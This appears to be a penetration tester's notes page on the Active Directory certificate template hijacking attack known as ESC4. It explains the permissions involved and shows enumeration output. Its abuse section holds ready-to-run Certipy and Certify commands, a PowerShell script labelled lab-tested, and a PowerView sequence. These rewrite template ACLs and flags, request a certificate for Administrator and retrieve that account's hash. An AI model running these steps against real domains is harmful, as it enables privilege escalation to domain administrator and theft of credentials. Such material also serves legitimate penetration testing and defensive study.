## Overview

If we have `FullControl`,`WriteDacl`, `WriteOwner` or specific `WriteProperty` rights over a template. Then we can modify the template to be vulnerable.

ESC4, or Template Hijacking, occurs when an attacker gains permissions to modify a certificate template object stored in Active Directory. Certificate templates are AD objects residing in the Configuration Naming Context (under `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=...`) and are protected by ACLs. If an attacker obtains `Write` access - such as `WriteDACL` (to change permissions), `WriteOwner` (to take ownership and then change permissions), specific `WriteProperty` rights on critical attributes, or `FullControl` - over a template object, they can alter its configuration.
For example, an attacker with such permissions could maliciously modify a template to:
- Grant enrollment rights on the template to themselves or a broad group like "Domain Users".
- Enable the "Enrollee Supplies Subject" setting (set the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag).
- Add a "Client Authentication" or "Any Purpose" EKU.
- Remove security controls like "CA certificate manager approval" or the requirement for authorized signatures.

It's important to note that ESC4 abuse focuses on modifying the template object's attributes in AD. An attacker cannot use ESC4 to make a CA _start_ issuing certificates based on a template if that template is not already enabled on the CA. Enabling or disabling which templates a CA offers is typically an ESC7-level action, requiring `Manage CA` rights on the CA object itself. Certipy's `find` command correlates templates defined in AD with the CAs that publish them (visible in the "Certificate Authorities" field for a template). If a template is not published by any CA, modifying it via ESC4 will not directly lead to certificate issuance until it is also enabled on a CA.

To make a template vulnerable, the following attributes need to be modified with the specified values:
- Grant Enrollment rights for the vulnerable template.
- Disable the `PEND_ALL_REQUESTS` flag in `mspki-enrollment-flag` to deactivate Manager Approval.
- Set the `mspki-ra-signature` attribute to `0` to disable the `Authorized Signature requirement`.
- Enable the `ENROLLEE_SUPPLIES_SUBJECT` flag in `mspki-certificate-name-flag` to allow requesting users to specify another privileged account name as a `SAN`.
- Set the `mspki-certificate-application-policy` to a certificate purpose for authentication:
	- Client Authentication (OID: 1.3.6.1.5.5.7.3.2)
    - Smart Card Logon (OID: 1.3.6.1.4.1.311.20.2.2)
    - PKINIT Client Authentication (OID: 1.3.6.1.5.2.3.4)
    - Any Purpose (OID: 2.5.29.37.0)
    - No Extended Key Usage (EKU)
---
## Enumeration
### Linux
```
Object Control Permissions
	Owner                           : CORP.LOCAL\Administrator
	Full Control Principals         : CORP.LOCAL\Domain Admins
									  CORP.LOCAL\Enterprise Admins
									  CORP.LOCAL\Authenticated Users
...
[+] User ACL Principals             : CORP.LOCAL\Authenticated Users
[!] Vulnerabilities
  ESC4                              : User has dangerous permissions.
```
### Windows
#### certify
```powershell
Permissions
  Enrollment Permissions
	Enrollment Rights           : LAB\Domain Users              S-1-5-21-2570265163-3918697770-3667495639-513
								  
	All Extended Rights         : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
  Object Control Permissions
	Owner                       : 
	Full Control Principals     : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
	WriteOwner Principals       : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103

	WriteDacl Principals        : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103

	WriteProperty Principals    : LAB\blwasp                    S-1-5-21-2570265163-3918697770-3667495639-1103
```
#### powershell
```

```

---
## Abuse
### Linux
```sh
# 1. Save the old template configurations, So we can revert changes after we finish exploit.
certipy template -u $USER -p $PASSWORD -dc-ip $IP -template "ESC4" -save-configuration old.json

# 2. Make the certificate vulnerable.
certipy template -u $USER -p $PASSWORD -dc-ip $IP -template "ESC4" -write-default-configuration -save-configuration

# 2.1 Checking if our changes have been made.
certipy find -u $USER -p $PASSWORD -dc-ip $IP -target $DC -vulnerable

# 3. Abuse vulnerable certificate
certipy req -u $USER -p $PASSWORD -dc-ip $IP -dc-host $DC -ca $CA -template "ESC4" -upn "administrator"

# 4. authenticate to get hash.
certipy auth -dc-ip "$IP" -domain "$DOMAIN" -username "administrator" -pfx administrator.pfx 

# 5. revert changes.
certipy template -u $USER -p $PASSWORD -template ESC4 -dc-ip $IP -target $DC -write-configuration old.json
```

### Windows
#### Certify_2
```sh
# new Certify
.\Certify.exe manage-template --template ESC4 --authorized-signatures 0 --manager-approval --supply-subject --client-auth --pkinit-auth --esc9
```
#### powershell
**IT WORKS, HAVE BEEN LAB TESTED**
```powershell
# Set Execution Policy (if needed)
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force

# Define variables
$domain = "DC=lab,DC=local"
$templateName = "ESC4"
$templateDN = "CN=$templateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,$domain"
$ca = "LAB-DC\lab-LAB-DC-CA"
$clientAuthOid = "1.3.6.1.5.5.7.3.2"
$enrollGuid = New-Object Guid "0e10c968-78fb-11d2-90d4-00c04f79dc55"  # Certificate-Enrollment extended right GUID

# 1. Add Certificate-Enrollment rights to Domain Users (ESC4 ACL modification)
$templateEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$templateDN")
$acl = $templateEntry.ObjectSecurity

# Resolve Domain Users to NTAccount (well-known SID: S-1-5-21-<domain>-513)
$principal = New-Object System.Security.Principal.NTAccount("lab\Domain Users")  # Replace 'lab' with your domain NetBIOS name

# Create ACE for ExtendedRight (Enroll)
$rights = [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight
$accessType = [System.Security.AccessControl.AccessControlType]::Allow
$inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]::None
$ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $principal, $rights, $accessType, $enrollGuid, $inheritance

# Add ACE and commit
$acl.AddAccessRule($ace)
$templateEntry.ObjectSecurity = $acl
$templateEntry.CommitChanges()
Write-Output "Added Enrollment rights to Domain Users on $templateName."

# 2. Set mspki-enrollment-flag to 9 (INCLUDE_SYMMETRIC_ALGORITHMS + PUBLISH_TO_DS, disabling PEND_ALL_REQUESTS)
$templateEntry.Put("mspki-enrollment-flag", 9)
$templateEntry.SetInfo()
Write-Output "Set mspki-enrollment-flag to 9."

# 3. Set mspki-ra-signature to 0 (disable authorized signature requirement)
$templateEntry.Put("mspki-ra-signature", 0)
$templateEntry.SetInfo()
Write-Output "Set mspki-ra-signature to 0."

# 4. Set mspki-certificate-name-flag to 1 (ENROLLEE_SUPPLIES_SUBJECT, enabling SAN supply for ESC1)
$templateEntry.Put("mspki-certificate-name-flag", 1)
$templateEntry.SetInfo()
Write-Output "Set mspki-certificate-name-flag to 1."

# 5. Set pkiextendedkeyusage to Client Authentication OID
$templateEntry.PutEx(2, "pkiextendedkeyusage", @($clientAuthOid))  # 2 = ADS_PROPERTY_UPDATE (replace)
$templateEntry.SetInfo()
Write-Output "Set pkiextendedkeyusage to $clientAuthOid."

# 6. Set mspki-certificate-application-policy to Client Authentication OID
$templateEntry.PutEx(2, "mspki-certificate-application-policy", @($clientAuthOid))
$templateEntry.SetInfo()
Write-Output "Set mspki-certificate-application-policy to $clientAuthOid."

# 7. Now request the cert using Certify (abusing as ESC1)
.\Certify.exe request /ca:$ca /template:$templateName /altname:Administrator
```


#### powerview
```powershell
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Import-Module .\PowerView.ps1

# 1. The first thing we will do is to add `Certificate-Enrollment rights` to the `Domain Users` group
Add-DomainObjectAcl -TargetIdentity ESC4 -PrincipalIdentity "Domain Users" -RightsGUID "0e10c968-78fb-11d2-90d4-00c04f79dc55" -TargetSearchBase "LDAP://CN=Configuration,DC=lab,DC=local" -Verbose

# 2. Next, we need to disable the manager approval requirement. the `PEND_ALL_REQUESTS` flag bit is `0x00000002`, so we need to remove this flag, we will use instead `0x00000001` that correspond to `CT_FLAG_INCLUDE_SYMMETRIC_ALGORITHMS` and `0x00000008` which is `CT_FLAG_PUBLISH_TO_DS`. To set both, we need to use `0x00000009` or `9`
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-enrollment-flag'=9} -Verbose

# 3. Now we need to disable `Authorized Signature Requirement`. We can set `mspki-ra-signature` attribute to `0`:
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-ra-signature'=0} -Verbose

# 4. to make this template vulnerable to ESC1, we will need to allow requesters to specify a `subjectAltName` in the `CSR`. This setting can be controlled by flag bits in `mspki-certificate-name-flag` attribute. `ENROLLEE_SUPPLIES_SUBJECT` flag bit is `0x00000001`.
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-name-flag'=1} -Verbose

# 5. The final part is to allow this certificate to be used for `Client Authentication`. We can set the `PKI Extended Key Usage` and the `mspki-certificate-application-policy` to the OID: `1.3.6.1.5.5.7.3.2`
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'pkiextendedkeyusage'='1.3.6.1.5.5.7.3.2'} -Verbose

# 6. Setting mspki-certificate-application-policy
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=lab,DC=local" -Identity ESC4 -Set @{'mspki-certificate-application-policy'='1.3.6.1.5.5.7.3.2'} -Verbose

# 7. Now we can use certify to abuse ESC4 as if it was ESC1.
.\Certify.exe request /ca:LAB-DC\lab-LAB-DC-CA /template:ESC4 /altname:Administrator

```
